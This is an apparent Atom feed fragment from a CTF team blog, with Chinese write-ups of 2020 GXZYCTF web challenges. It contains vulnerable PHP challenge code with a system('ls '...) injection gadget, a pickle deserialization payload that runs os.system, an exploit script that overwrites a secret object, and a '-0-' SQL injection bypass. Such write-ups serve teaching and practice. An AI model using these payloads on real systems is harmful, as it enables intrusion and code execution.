class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($file)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file = $file;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;deal&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $extensionarr=&lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;gif&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;jpeg&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;jpg&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;png&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $extension = pathinfo(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;], PATHINFO_EXTENSION);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $type = &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&#39;type&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;comment&quot;&gt;//echo &quot;type: &quot;.$type;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        $filetypearr=&lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;image/jpeg&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;image/png&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;image/gif&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(in_array($extension,$extensionarr)&amp;amp;in_array($type,$filetypearr)&amp;amp;&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&quot;size&quot;&lt;/span&gt;]&amp;lt;&lt;span class=&quot;number&quot;&gt;204800&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ($_FILES[&lt;span class=&quot;string&quot;&gt;&quot;file&quot;&lt;/span&gt;][&lt;span class=&quot;string&quot;&gt;&quot;error&quot;&lt;/span&gt;] &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;错误：: &quot;&lt;/span&gt; .&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&quot;error&quot;&lt;/span&gt;] . &lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!is_dir(&lt;span class=&quot;string&quot;&gt;&quot;./uploads/&quot;&lt;/span&gt;.md5($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;]).&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    mkdir(&lt;span class=&quot;string&quot;&gt;&quot;./uploads/&quot;&lt;/span&gt;.md5($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;]).&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                $upload_dir=&lt;span class=&quot;string&quot;&gt;&quot;./uploads/&quot;&lt;/span&gt;.md5($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;REMOTE_ADDR&#39;&lt;/span&gt;]).&lt;span class=&quot;string&quot;&gt;&quot;/&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                move_uploaded_file(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&quot;tmp_name&quot;&lt;/span&gt;],$upload_dir.md5(&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;uploadfile[&lt;span class=&quot;string&quot;&gt;&#39;name&#39;&lt;/span&gt;]).&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;.$extension);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;上传成功&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;不被允许的文件类型&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__destruct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file-&amp;gt;xs();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Listfile&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; $file;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__construct&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($file)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file=$file;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;listdir&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        system(&lt;span class=&quot;string&quot;&gt;&quot;ls &quot;&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file).&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;__call&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;($name, $arguments)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        system(&lt;span class=&quot;string&quot;&gt;&quot;ls &quot;&lt;/span&gt;.&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;file);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_Rogue-Mysql-Server" scheme="https://boiteam.github.io/tags/Web-Rogue-Mysql-Server/"/>
    
      <category term="Web_phar反序列化" scheme="https://boiteam.github.io/tags/Web-phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF webtmp</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_webtmp/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_webtmp/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:21:58.005Z</updated>
    
    <content type="html"><![CDATA[<p>过滤了<code>R</code></p><p><a href="https://zhuanlan.zhihu.com/p/89132768" target="_blank" rel="noopener">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势</a></p><p>一开始考虑RCE</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b'<span class="symbol">\x</span>80<span class="symbol">\x</span>03c__main__<span class="symbol">\n</span>Animal<span class="symbol">\n</span>)<span class="symbol">\x</span>81&#125;(V__setstate__<span class="symbol">\n</span>cos<span class="symbol">\n</span>system<span class="symbol">\n</span>ubVls /<span class="symbol">\n</span>b0c__main__<span class="symbol">\n</span>Animal<span class="symbol">\n</span>)<span class="symbol">\x</span>81&#125;(X<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00nameq<span class="symbol">\x</span>03X<span class="symbol">\x</span>14<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>e4<span class="symbol">\x</span>b8<span class="symbol">\x</span>80<span class="symbol">\x</span>e7<span class="symbol">\x</span>bb<span class="symbol">\x</span>99<span class="symbol">\x</span>e6<span class="symbol">\x</span>88<span class="symbol">\x</span>91<span class="symbol">\x</span>e5<span class="symbol">\x</span>93<span class="symbol">\x</span>a9giaogiaoq<span class="symbol">\x</span>04X<span class="symbol">\x</span>08<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00categoryq<span class="symbol">\x</span>05X<span class="symbol">\x</span>04<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00Giaoq<span class="symbol">\x</span>06ub.'</span><br></pre></td></tr></table></figure><p>提示global XX，应该是因为<code>raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))</code>，后来考虑改写secret对象</p><p><img src="/2020/03/09/2020_GXZYCTF_webtmp/1584744931(1).jpg" alt></p><p>secret.py</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secret</span> = &#123;<span class="string">'name'</span>:<span class="string">'xx'</span>,<span class="string">'category'</span>:<span class="string">'yy'</span>&#125;</span><br></pre></td></tr></table></figure><p>exp.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.name = <span class="string">'aa'</span></span><br><span class="line">        self.category = <span class="string">'bb'</span></span><br><span class="line">s = <span class="string">b'\x80\x03c__main__\nsecret\n&#125;(Vname\nVaa\nVcategory\nVbb\nub0c__main__\nAnimal\n)\x81&#125;(X\x04\x00\x00\x00nameX\x02\x00\x00\x00aaX\x08\x00\x00\x00categoryX\x02\x00\x00\x00bbub.'</span></span><br><span class="line">l = pickle.loads(s)</span><br><span class="line">pickletools.dis(s)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/09/2020_GXZYCTF_webtmp/1584745003(1).jpg" alt="1584745003(1)"></p><p>base64编码即可</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;过滤了&lt;code&gt;R&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/89132768&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;从零开始python反序列化攻击：pickle原理解析 &amp;amp; 不用reduce的RCE姿势&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="Python" scheme="https://boiteam.github.io/categories/Web/Python/"/>
    
    
      <category term="Web_python反序列化" scheme="https://boiteam.github.io/tags/Web-python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>2020 GXZYCTF sqlcheckin</title>
    <link href="https://boiteam.github.io/2020/03/09/2020_GXZYCTF_sqlchekin/"/>
    <id>https://boiteam.github.io/2020/03/09/2020_GXZYCTF_sqlchekin/</id>
    <published>2020-03-09T01:52:20.000Z</published>
    <updated>2020-03-21T11:35:08.890Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/03/09/2020_GXZYCTF_sqlchekin/1584754809272-1584787008127.png" alt="1584754809272"></p><p>进去可以看到这个页面, 源码如下</p><p><img src="/2020/03/09/2020_GXZYCTF_sqlchekin/1584754823938.png" alt="1584754823938"></p><p>有原题</p><p><a href="https://gksec.com/HNCTF2019-Final.html" target="_blank" rel="noopener">https://gksec.com/HNCTF2019-Final.html</a></p><p>　所以根据一番资料查找，发现<code>&#39;-0-&#39;</code>可以代替<code>&#39;or&#39;1</code>绕过。</p><p><img src="/2020/03/09/2020_GXZYCTF_sqlchekin/1584754952564-1584787068337.png" alt="1584754952564"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2020/03/09/2020_GXZYCTF_sqlchekin/1584754809272-1584787008127.png&quot; alt=&quot;1584754809272&quot;&gt;&lt;/p&gt;
&lt;p&gt;进去可以看到这个页面, 源码如下&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_sql注入" scheme="https://boiteam.github.io/tags/Web-sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
</feed>
